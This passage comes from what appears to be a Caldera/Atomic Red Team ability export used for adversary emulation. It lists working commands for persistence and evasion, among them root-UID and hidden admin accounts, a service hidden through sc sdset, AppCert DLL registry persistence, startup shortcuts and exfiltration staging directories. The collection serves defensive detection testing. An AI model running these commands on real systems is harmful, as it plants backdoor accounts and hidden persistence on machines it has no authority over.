\"BetterWithButter\" | passwd --stdin butter; fi;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Create Account: Local Account", "ability_id": "cbaeea20cd3e11d2bf3512f91b155410", "technique_id": "T1136.001", "tactic": "persistence", "requirements": [], "name": "Create a new user in Linux with `root` UID and GID.", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-LocalUser -Name \"T1136.001_PowerShell\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-LocalUser -Name \"T1136.001_PowerShell\" -NoPassword", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Create Account: Local Account", "ability_id": "f39aace719f4cdcf8569001f7a25aabf", "technique_id": "T1136.001", "tactic": "persistence", "requirements": [], "name": "Create a new user in PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net user /del \"T1136.001_CMD\" >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user /add \"T1136.001_CMD\" \"T1136.001_CMD!\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Create Account: Local Account", "ability_id": "c93df79781db0a1ed7cc34323f2ecec0", "technique_id": "T1136.001", "tactic": "persistence", "requirements": [], "name": "Create a new user in a command prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Schedule a system level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["systemctl stop Atomic-Red-Team.service; systemctl stop Atomic-Red-Team.timer; rm /tmp/log"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Systemd Timers", "ability_id": "6de55cdb0e4e9cc25ea32b66d93d3039", "technique_id": "T1053.006", "tactic": "multiple", "requirements": [], "name": "Create a system level transient systemd service and timer", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create a user via useradd\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "root"}]}], "cleanup": ["userdel evil_user"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "useradd -M -N -r -s /bin/bash -c evil_account evil_user", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Create Account: Local Account", "ability_id": "d9eaee9a1d1851fa44d69442f0bb3fe0", "technique_id": "T1136.001", "tactic": "persistence", "requirements": [], "name": "Create a user account on a Linux system", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a user on a MacOS system with dscl\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["dscl . -delete /Users/evil_user"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "dscl . -create /Users/evil_user; dscl . -create /Users/evil_user UserShell /bin/zsh; dscl . -create /Users/evil_user RealName \"Evil Account\"; dscl . -create /Users/evil_user UniqueID \"1010\"; dscl . -create /Users/evil_user PrimaryGroupID 80; dscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Create Account: Local Account", "ability_id": "45c73c8b658b660da5cc7bb6207bc08f", "technique_id": "T1136.001", "tactic": "persistence", "requirements": [], "name": "Create a user account on a MacOS system", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Schedule a user level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["systemctl --user stop Atomic-Red-Team.service; systemctl --user stop Atomic-Red-Team.timer; rm /tmp/log"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Systemd Timers", "ability_id": "f0e294c25efe6c5a459c2e353f586b10", "technique_id": "T1053.006", "tactic": "multiple", "requirements": [], "name": "Create a user level transient systemd service and timer", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creating a user with a username containing with a space on the end", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-LocalUser -Name \"Administrator \" 2>&1 | out-null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-LocalUser -Name \"Administrator \" -NoPassword", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts", "ability_id": "83a5ad479c9e313e60f34380e193102a", "technique_id": "T1564", "tactic": "defense-evasion", "requirements": [], "name": "Create an \"Administrator \" user (with a space on the end)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates and executes a simple bash script.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/art.sh"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"; sh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"; chmod +x /tmp/art.sh; sh /tmp/art.sh", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/art.sh"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"; sh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"; chmod +x /tmp/art.sh; sh /tmp/art.sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "8a84968196ec3b64b747b15008cafc2f", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "Create and Execute Bash Shell Script", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\T1059.003_script.bat -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-Process $env:TEMP\\T1059.003_script.bat", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Windows Command Shell", "ability_id": "d4aa13cd6322080455d334e6fc2d5972", "technique_id": "T1059.003", "tactic": "execution", "requirements": [], "name": "Create and Execute Batch Script", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following technique utilizes sc.exe and sdset to change the security descriptor of a service and \"hide\" it from Get-Service or sc query.\n\nUpon successful execution, sc.exe creates a new service changes the security descriptor.\n\nhttps://twitter.com/Alh4zr3d/status/1580925761996828672\nhttps://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sc sdset AtomicService \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\" && sc.exe delete AtomicService"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sc.exe create AtomicService binPath= \"C:\\Windows\\System32\\calc.exe\" && sc sdset AtomicService \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts", "ability_id": "91531bc5832f6753d924bae901932cb5", "technique_id": "T1564", "tactic": "defense-evasion", "requirements": [], "name": "Create and Hide a Service with sc.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-VM $VM -Force; Remove-VM $VM -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V) { ; } else {Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force};  ;  $VM = \"Atomic VM\"; New-VM -Name $VM -Generation 2; Set-VMFirmware $VM -EnableSecureBoot Off; Start-VM $VM", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Run Virtual Instance", "ability_id": "5b0527d3382ac91860501cccc9595348", "technique_id": "T1564.006", "tactic": "defense-evasion", "requirements": [], "name": "Create and start Hyper-V virtual machine", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create a simple VirtualBox VM and start up the machine\nCleanup command stops and deletes the newly created VM and associated files\nhttps://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm\nhttps://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\nhttps://attack.mitre.org/techniques/T1564/006/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" controlvm \"Atomic VM\" poweroff && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" unregistervm \"Atomic VM\" --delete"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" createvm --name \"Atomic VM\" --register && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" modifyvm \"Atomic VM\" --firmware efi && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" startvm \"Atomic VM\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Run Virtual Instance", "ability_id": "e572cf6ff4a756e5549353ca96bed1d6", "technique_id": "T1564.006", "tactic": "defense-evasion", "requirements": [], "name": "Create and start VirtualBox virtual machine", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may wish to create an account with admin privileges to work with. In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["userdel -r art"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art; su art; whoami; exit", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Local Accounts", "ability_id": "07315b5d93b5ea5a78b34a54be41222f", "technique_id": "T1078.003", "tactic": "multiple", "requirements": [], "name": "Create local account (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "After execution the new account will be active and added to the Administrators group", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net localgroup administrators art-test /delete >nul 2>&1 && net user art-test /delete >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user art-test /add && net user art-test #{password} && net localgroup administrators art-test /add", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Local Accounts", "ability_id": "c74f43a6ba27a277e8214be228a6360f", "technique_id": "T1078.003", "tactic": "multiple", "requirements": [], "name": "Create local account with admin privileges", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "After execution the new account will be active and added to the Administrators group", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo dscl . -delete /Users/AtomicUser"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "dscl . -create /Users/AtomicUser; dscl . -create /Users/AtomicUser UserShell /bin/bash; dscl . -create /Users/AtomicUser RealName \"Atomic User\"; dscl . -create /Users/AtomicUser UniqueID 503; dscl . -create /Users/AtomicUser PrimaryGroupID 503; dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser; dscl . -passwd /Users/AtomicUser mySecretPassword; dscl . -append /Groups/admin GroupMembership AtomicUser", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Local Accounts", "ability_id": "d7264e14d130acb7e172b05ec2e1ae47", "technique_id": "T1078.003", "tactic": "multiple", "requirements": [], "name": "Create local account with admin privileges - MacOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "After execution the new account will be active and added to the Administrators group", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sysadminctl interactive -deleteUser art-tester"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Local Accounts", "ability_id": "bbc5f212082c3b0472a1f50748d9be2a", "technique_id": "T1078.003", "tactic": "multiple", "requirements": [], "name": "Create local account with admin privileges using sysadminctl utility - MacOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["7e8ee7_AtomicTest.dll"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["reg delete \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /f; Remove-Item C:\\Users\\Public\\AtomicTest.dll -Force; Remove-Item C:\\Users\\Public\\AtomicTest.txt -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item 7e8ee7_AtomicTest.dll C:\\Users\\Public\\AtomicTest.dll -Force; reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; if($false){Restart-Computer}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: AppCert DLLs", "ability_id": "2883ed253a0b6fa034cd76ec72c89d3b", "technique_id": "T1546.009", "tactic": "multiple", "requirements": [], "name": "Create registry persistence via AppCert DLL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore; Remove-Item \"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save(); $Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save()", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification", "ability_id": "501af516bd8b24fee0c7c650ae5cc861", "technique_id": "T1547.009", "tactic": "multiple", "requirements": [], "name": "Create shortcut to cmd in startup folders", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "create a directory for exfil staging", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["rm -rf staged"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "mkdir -p staged && echo $PWD/staged", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["rm -rf staged"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "mkdir -p staged && echo $PWD/staged", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["Remove-Item -Path \"staged\" -recurse"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["Remove-Item -Path \"staged\" -recurse"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Data Staged: Local Data Staging", "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89", "technique_id": "T1074.001", "tactic": "collection", "requirements": [{"relationship_match": [{"source": "info.created"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Create staging directory", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "create a directory for exfil staging", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["rm -rf staged"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "mkdir -p staged && echo $PWD/staged", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["rm -rf staged"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "mkdir -p staged && echo $PWD/staged", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["Remove-Item -Path \"staged\" -recurse"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["Remove-Item -Path \"staged\" -recurse"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Data Staged: Local Data Staging", "ability_id": "aed09300-3579-40dc-a438-08168b3f1602", "technique_id": "T1074.001", "tactic": "collection", "requirements": [{"relationship_match": [{"source": "info.created"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Create staging directory ", "plugin": ""}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "create a directory for exfil staging", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["rm -rf staged"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "mkdir -p staged && echo $PWD/staged", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["rm -rf staged"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "mkdir -p staged && echo $PWD/staged", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["Remove-Item -Path \"staged\" -recurse"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["Remove-Item -Path \"staged\" -recurse"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Data Staged: Local Data Staging", "ability_id": "885ab473-8bff-49ab-98b9-c255a7ad75bc", "technique_id": "T1074.001", "tactic": "collection", "requirements": [{"relationship_match": [{"source": "info.created"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Create staging directory   ", "plugin": ""}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The Bash shell runs ~/.bash_logout \"if it exists\" to run commands on user logout. An adversary may create or append to a .bash_logout to clear history, start processes etc. Note the ~/.bash_logout is only run if you explicitly exit or log out of an \"interactive login shell session\" i.e. via the console, SSH, /bin/bash -l or su -l <username>. \n\nThis test creates the art user, logs in, creates a .bash_logout which will echo some text into the art.txt file on logout and logs out and the /home/art/art.txt is created.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["userdel -fr art"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "useradd --create-home --shell /bin/bash art; su --login art; echo 'echo \"Atomic Red Team was here... T1546.004\" >> $HOME/art.txt' >> $HOME/.bash_logout", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: .bash_profile and .bashrc", "ability_id": "cf0d29048615fe0d040e55067b684b49", "technique_id": "T1546.004", "tactic": "multiple", "requirements": [], "name": "Create/Append to .bash_logout", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["kubectl delete cronjob art -n default"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "kubectl create -f src/cronjob.yaml -n default", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Kubernetes Cronjob", "ability_id": "ded1bca3c653f7ee376b7f9f72146597", "technique_id": "T1053.007", "tactic": "multiple", "requirements": [], "name": "CreateCronjob", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "GCP Service Accounts can be used to gain intial access as well as maintain persistence inside Google Cloud.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["gcloud iam service-accounts delete gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com --quiet"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "gcloud auth login --no-launch-browser; gcloud config set project art-project-1; gcloud iam service-accounts create gcp-art-service-account-1; gcloud iam service-accounts keys create gcp-art-service-account-1.json --iam-account=gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Cloud Accounts", "ability_id": "17864bace5099482c4b06b3ab032fb71", "technique_id": "T1078.004", "tactic": "multiple", "requirements": [], "name": "Creating GCP Service Account and Service Account Key", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creating W32Time similar named service (win32times) using sc just like threat actor dubbed \"Operation Wocao\"", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sc delete win32times"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\" && sc qc win32times", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Masquerading: Masquerade Task or Service", "ability_id": 